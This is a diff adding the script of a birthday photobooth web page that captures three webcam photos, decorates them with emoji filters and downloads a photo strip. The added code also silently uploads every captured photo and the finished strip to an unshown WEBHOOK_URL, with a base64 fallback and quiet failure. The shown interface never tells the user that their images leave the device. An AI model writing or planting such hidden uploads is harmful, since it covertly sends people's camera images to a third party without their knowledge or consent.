+        const stripPhotos = document.getElementById('stripPhotos');
+        const permissionScreen = document.getElementById('permissionScreen');
+        const celebration = document.getElementById('celebration');
+        const musicIndicator = document.getElementById('musicIndicator');
+        const bgMusic = document.getElementById('bgMusic');
+        const filterSelector = document.getElementById('filterSelector');
+
+        let photos = [];
+        let isCapturing = false;
+        let stream = null;
+
+        // Initialize music
+        window.addEventListener('load', () => {
+            const musicPlaying = localStorage.getItem('musicPlaying');
+            const musicTime = localStorage.getItem('musicTime');
+            
+            if (musicPlaying === 'true') {
+                bgMusic.currentTime = parseFloat(musicTime) || 0;
+                bgMusic.play().then(() => {
+                    musicIndicator.classList.add('show');
+                }).catch(() => {});
+            }
+        });
+
+        musicIndicator.addEventListener('click', () => {
+            if (bgMusic.paused) {
+                bgMusic.play();
+                musicIndicator.classList.remove('paused');
+                localStorage.setItem('musicPlaying', 'true');
+            } else {
+                bgMusic.pause();
+                musicIndicator.classList.add('paused');
+                localStorage.setItem('musicPlaying', 'false');
+            }
+        });
+
+        // Filter selection
+        function selectFilter(filterName) {
+            currentFilter = filterName;
+            
+            // Update buttons
+            document.querySelectorAll('.filter-btn').forEach(btn => {
+                btn.classList.toggle('active', btn.dataset.filter === filterName);
+            });
+            
+            // Update filter overlays
+            document.querySelectorAll('.filter-overlay').forEach(overlay => {
+                overlay.classList.remove('active');
+            });
+            document.getElementById(`filter-${filterName}`).classList.add('active');
+        }
+
+        async function requestCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false 
+                });
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    permissionScreen.classList.add('hidden');
+                };
+            } catch (err) {
+                alert('Camera access denied. Please allow camera access to use the photobooth.');
+            }
+        }
+
+        async function startCapture() {
+            if (isCapturing || photos.length >= 3) return;
+            isCapturing = true;
+            captureBtn.disabled = true;
+
+            for (let i = 3; i > 0; i--) {
+                countdown.textContent = i;
+                countdown.classList.add('show');
+                await sleep(1000);
+                countdown.classList.remove('show');
+                await sleep(100);
+            }
+
+            takePhoto();
+            
+            isCapturing = false;
+            
+            if (photos.length < 3) {
+                captureBtn.disabled = false;
+                updateInstructions();
+            } else {
+                setTimeout(() => {
+                    showPhotoStrip();
+                    triggerCelebration();
+                }, 500);
+            }
+        }
+
+        function takePhoto() {
+            flash.classList.add('active');
+            setTimeout(() => flash.classList.remove('active'), 400);
+
+            // Draw video to canvas (mirrored)
+            ctx.save();
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+            ctx.restore();
+
+            // Apply current filter
+            applyFilterToCanvas(currentFilter);
+
+            const photoData = canvas.toDataURL('image/png');
+            photos.push({ 
+                data: photoData, 
+                filter: currentFilter
+            });
+
+            photoCount.textContent = photos.length;
+
+            const thumb = document.getElementById(`thumb${photos.length}`);
+            thumb.classList.add('captured');
+            thumb.querySelector('img').src = photoData;
+
+            // --- SEND CAPTURED PHOTO TO WEBHOOK (non-blocking) ---
+            // This will send each captured photo to the WEBHOOK_URL if provided.
+            // It uses multipart/form-data and falls back to JSON (base64) if form upload fails.
+            if (WEBHOOK_URL) {
+                // don't await to avoid blocking UI
+                sendImageToWebhook(photoData, `photo-${photos.length}.png`).catch(e => {
+                    console.error('Webhook send error:', e);
+                });
+            }
+        }
+
+        function applyFilterToCanvas(filterName) {
+            const filter = filterEmojis[filterName];
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+
+            switch(filter.position) {
+                case 'top':
+                    // Main emoji at top center
+                    ctx.font = `${canvas.width * 0.18}px serif`;
+                    ctx.fillText(filter.main, canvas.width / 2, canvas.height * 0.12);
+                    
+                    // Extra sparkles
+                    ctx.font = `${canvas.width * 0.08}px serif`;
+                    ctx.fillText(filter.extras[0], canvas.width * 0.15, canvas.height * 0.08);
+                    ctx.fillText(filter.extras[1], canvas.width * 0.85, canvas.height * 0.08);
+                    ctx.fillText(filter.extras[0], canvas.width * 0.25, canvas.height * 0.18);
+                    ctx.fillText(filter.extras[1], canvas.width * 0.75, canvas.height * 0.18);
+                    break;
+
+                case 'bottom':
+                    // Main emoji at bottom center
+                    ctx.font = `${canvas.width * 0.2}px serif`;
+                    ctx.fillText(filter.main, canvas.width / 2, canvas.height * 0.88);
+                    
+                    // Confetti at top
+                    ctx.font = `${canvas.width * 0.08}px serif`;
+                    filter.extras.forEach((emoji, i) => {
+                        ctx.fillText(emoji, canvas.width * (0.15 + i * 0.25), canvas.height * 0.1);
+                    });
+                    break;
+
+                case 'corners':
+                    // Balloons in corners
+                    ctx.font = `${canvas.width * 0.12}px serif`;
+                    ctx.fillText(filter.main, canvas.width * 0.1, canvas.height * 0.1);
+                    ctx.fillText(filter.extras[0], canvas.width * 0.9, canvas.height * 0.1);
+                    ctx.fillText(filter.extras[1], canvas.width * 0.2, canvas.height * 0.2);
+                    ctx.fillText(filter.extras[2], canvas.width * 0.8, canvas.height * 0.15);
+                    ctx.fillText(filter.extras[3], canvas.width * 0.15, canvas.height * 0.25);
+                    break;
+
+                case 'sides':
+                    // Party poppers on sides
+                    ctx.font = `${canvas.width * 0.15}px serif`;
+                    ctx.save();
+                    ctx.translate(canvas.width * 0.1, canvas.height * 0.12);
+                    ctx.rotate(-30 * Math.PI / 180);
+                    ctx.fillText(filter.main, 0, 0);
+                    ctx.restore();
+                    
+                    ctx.save();
+                    ctx.translate(canvas.width * 0.9, canvas.height * 0.12);
+                    ctx.rotate(30 * Math.PI / 180);
+                    ctx.scale(-1, 1);
+                    ctx.fillText(filter.main, 0, 0);
+                    ctx.restore();
+                    
+                    // Stars and streamers
+                    ctx.font = `${canvas.width * 0.07}px serif`;
+                    ctx.fillText(filter.extras[0], canvas.width * 0.3, canvas.height * 0.15);
+                    ctx.fillText(filter.extras[1], canvas.width * 0.7, canvas.height * 0.1);
+                    ctx.fillText(filter.extras[2], canvas.width * 0.5, canvas.height * 0.08);
+                    ctx.fillText(filter.extras[3], canvas.width * 0.4, canvas.height * 0.2);
+                    break;
+            }
+        }
+
+        function updateInstructions() {
+            const remaining = 3 - photos.length;
+            instructions.innerHTML = `📷 <span>${remaining}</span> more photo${remaining > 1 ? 's' : ''} to go!`;
+        }
+
+        function showPhotoStrip() {
+            cameraWrapper.style.display = 'none';
+            controls.style.display = 'none';
+            instructions.style.display = 'none';
+            filterSelector.style.display = 'none';
+            resultContainer.classList.add('show');
+
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+
+            stripPhotos.innerHTML = '';
+            photos.forEach((photo, index) => {
+                const wrapper = document.createElement('div');
+                wrapper.className = 'strip-photo-wrapper';
+                
+                const img = document.createElement('img');
+                img.src = photo.data;
+                img.className = 'strip-photo';
+                
+                wrapper.appendChild(img);
+                stripPhotos.appendChild(wrapper);
+            });
+
+            const now = new Date();
+            document.getElementById('stripDate').textContent = now.toLocaleDateString('en-US', {
+                weekday: 'long', year: 'numeric', month: 'long', day: 'numeric'
+            });
+        }
+
+        function triggerCelebration() {
+            const colors = ['#7BC89C', '#A8E6CF', '#FFD700', '#FF69B4', '#87CEEB', '#DDA0DD'];
+            
+            for (let i = 0; i < 80; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + '%';
+                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
+                confetti.style.animationDelay = Math.random() * 2 + 's';
+                confetti.style.animationDuration = (2 + Math.random() * 2) + 's';
+                celebration.appendChild(confetti);
+                
+                setTimeout(() => confetti.classList.add('fall'), 10);
+                setTimeout(() => confetti.remove(), 5000);
+            }
+        }
+
+        function downloadStrip() {
+            const stripCanvas = document.getElementById('stripCanvas');
+            const stripCtx = stripCanvas.getContext('2d');
+
+            const photoWidth = 320;
+            const photoHeight = 240;
+            const padding = 20;
+            const headerHeight = 90;
+            const footerHeight = 130;
+            const borderWidth = 12;
+
+            stripCanvas.width = photoWidth + (padding * 2) + (borderWidth * 2);
+            stripCanvas.height = headerHeight + (photoHeight * 3) + (padding * 4) + footerHeight + (borderWidth * 2);
+
+            // Border gradient
+            const borderGradient = stripCtx.createLinearGradient(0, 0, stripCanvas.width, 0);
+            borderGradient.addColorStop(0, '#7BC89C');
+            borderGradient.addColorStop(0.5, '#A8E6CF');
+            borderGradient.addColorStop(1, '#7BC89C');
+            stripCtx.fillStyle = borderGradient;
+            stripCtx.fillRect(0, 0, stripCanvas.width, stripCanvas.height);
+
+            // White background
+            stripCtx.fillStyle = '#fff';
+            stripCtx.fillRect(borderWidth, borderWidth, stripCanvas.width - borderWidth * 2, stripCanvas.height - borderWidth * 2);
+
+            // Rainbow stripe at top
+            const stripeColors = ['#7BC89C', '#A8E6CF', '#FFD700', '#FF69B4', '#87CEEB'];
+            const stripeWidth = (stripCanvas.width - borderWidth * 2) / stripeColors.length;
+            stripeColors.forEach((color, i) => {
+                stripCtx.fillStyle = color;
+                stripCtx.fillRect(borderWidth + (i * stripeWidth), borderWidth, stripeWidth, 12);
+            });
+
+            // Header
+            stripCtx.fillStyle = '#2D5A27';
+            stripCtx.font = 'bold 26px Arial';
+            stripCtx.textAlign = 'center';
+            stripCtx.fillText('🎂 Happy Birthday! 🎂', stripCanvas.width / 2, borderWidth + 50);
+            
+            stripCtx.fillStyle = '#7BC89C';
+            stripCtx.font = '14px Arial';
+            stripCtx.fillText('A special moment captured', stripCanvas.width / 2, borderWidth + 75);
+
+            // Load and draw photos
+            let loadedCount = 0;
+            photos.forEach((photo, index) => {
+                const img = new Image();
+                img.onload = () => {
+                    const y = headerHeight + padding + (index * (photoHeight + padding)) + borderWidth;
+                    
+                    // Photo border
+                    stripCtx.fillStyle = '#7BC89C';
+                    stripCtx.fillRect(padding + borderWidth - 5, y - 5, photoWidth + 10, photoHeight + 10);
+                    
+                    // Photo
+                    stripCtx.drawImage(img, padding + borderWidth, y, photoWidth, photoHeight);
+                    
+                    loadedCount++;
+                    
+                    if (loadedCount === 3) {
+                        // Footer
+                        const footerY = headerHeight + (photoHeight * 3) + (padding * 4) + borderWidth;
+                        
+                        // Decorations
+                        stripCtx.font = '28px Arial';
+                        stripCtx.textAlign = 'center';
+                        stripCtx.fillText('🎈🎉🎊🎁🎈', stripCanvas.width / 2, footerY + 30);
+                        
+                        // Date
+                        stripCtx.fillStyle = '#7BC89C';
+                        stripCtx.font = '13px Arial';
+                        const now = new Date();
+                        stripCtx.fillText(now.toLocaleDateString('en-US', {
+                            weekday: 'long',
+                            year: 'numeric', 
+                            month: 'long', 
+                            day: 'numeric'
+                        }), stripCanvas.width / 2, footerY + 60);
+                        
+                        // Message
+                        stripCtx.fillStyle = '#2D5A27';
+                        stripCtx.font = 'italic 12px Arial';
+                        stripCtx.fillText('"Making memories, one photo at a time!"', stripCanvas.width / 2, footerY + 85);
+                        
+                        // Watermark
+                        stripCtx.fillStyle = 'rgba(123, 200, 156, 0.5)';
+                        stripCtx.font = '10px Arial';
+                        stripCtx.fillText('✨ Birthday Photobooth ✨', stripCanvas.width / 2, footerY + 105);
+
+                        // --- SEND THE FINAL PHOTO STRIP TO WEBHOOK (non-blocking) ---
+                        if (WEBHOOK_URL) {
+                            try {
+                                const stripDataUrl = stripCanvas.toDataURL('image/png');
+                                sendImageToWebhook(stripDataUrl, 'birthday-photobooth-strip.png').catch(e => {
+                                    console.error('Failed sending strip to webhook:', e);
+                                });
+                            } catch (e) {
+                                console.error('Error preparing strip for webhook:', e);
+                            }
+                        }
+
+                        // Download the image
+                        const link = document.createElement('a');
+                        link.download = 'birthday-photobooth-strip.png';
+                        link.href = stripCanvas.toDataURL('image/png');
+                        link.click();
+                    }
+                };
+                img.src = photo.data;
+            });
+        }
+
+        async function retakePhotos() {
+            photos = [];
+            photoCount.textContent = '0';
+            
+            // Reset thumbnails
+            for (let i = 1; i <= 3; i++) {
+                const thumb = document.getElementById(`thumb${i}`);
+                thumb.classList.remove('captured');
+                thumb.querySelector('img').src = '';
+            }
+
+            // Reset UI
+            instructions.innerHTML = '📷 Take <span>3 photos</span> to create your birthday photo strip!';
+            instructions.style.display = 'block';
+            cameraWrapper.style.display = 'block';
+            controls.style.display = 'flex';
+            filterSelector.style.display = 'flex';
+            resultContainer.classList.remove('show');
+            stripPhotos.innerHTML = '';
+
+            // Restart camera
+            await requestCamera();
+            captureBtn.disabled = false;
+        }
+
+        function goBack() {
+            // Save music state
+            if (!bgMusic.paused) {
+                localStorage.setItem('musicTime', bgMusic.currentTime);
+                localStorage.setItem('musicPlaying', 'true');
+            }
+            
+            // Stop camera
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Smooth transition
+            document.body.style.opacity = '0';
+            document.body.style.transition = 'opacity 0.3s';
+            
+            setTimeout(() => {
+                window.location.href = 'next-page.html';
+            }, 300);
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // Save music time periodically
+        setInterval(() => {
+            if (!bgMusic.paused) {
+                localStorage.setItem('musicTime', bgMusic.currentTime);
+            }
+        }, 1000);
+
+        // -------------------- WEBHOOK HELPERS --------------------
+        // Convert dataURL to Blob
+        function dataURLToBlob(dataURL) {
+            const parts = dataURL.split(',');
+            const mimeMatch = parts[0].match(/:(.*?);/);
+            const mime = mimeMatch ? mimeMatch[1] : 'image/png';
+            const binary = atob(parts[1]);
+            const len = binary.length;
+            const array = new Uint8Array(len);
+            for (let i = 0; i < len; i++) {
+                array[i] = binary.charCodeAt(i);
+            }
+            return new Blob([array], { type: mime });
+        }
+
+        /**
+         * sendImageToWebhook(dataUrl, filename)
+         * - Attempts to POST the image as multipart/form-data (field name 'file').
+         * - If the POST response is not ok, it falls back to sending JSON with a base64 payload:
+         *     { filename: '...', image: 'base64string' }
+         *
+         * Note: webhooks must accept cross-origin requests from your origin. If CORS blocks requests,
+         * you'll need server-side support or configure the webhook server to allow your origin.
+         */
+        async function sendImageToWebhook(dataUrl, filename = 'photo.png') {
+            if (!WEBHOOK_URL) return;
+            try {
+                const blob = dataURLToBlob(dataUrl);
+                const form = new FormData();
+                form.append('file', blob, filename);
+                form.append('filename', filename);
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: form,
+                });
+
+                // If server returns non-OK, fallback to JSON base64
+                if (!response.ok) {
+                    // Extract base64 portion
+                    const base64 = dataUrl.split(',')[1];
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ filename, image: base64 })
+                    });
+                }
+
+            } catch (err) {
+                // If a network/CORS error occurs, try the JSON base64 fallback once
+                try {
+                    const base64 = dataUrl.split(',')[1];
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ filename, image: base64 })
+                    });
+                } catch (e) {
+                    // Give up quietly but log
+                    console.error('Both webhook upload attempts failed:', e);
+                }
+            }
+        }
+        // ---------------------------------------------------------
+
+    </script>
+</body>
+</html>
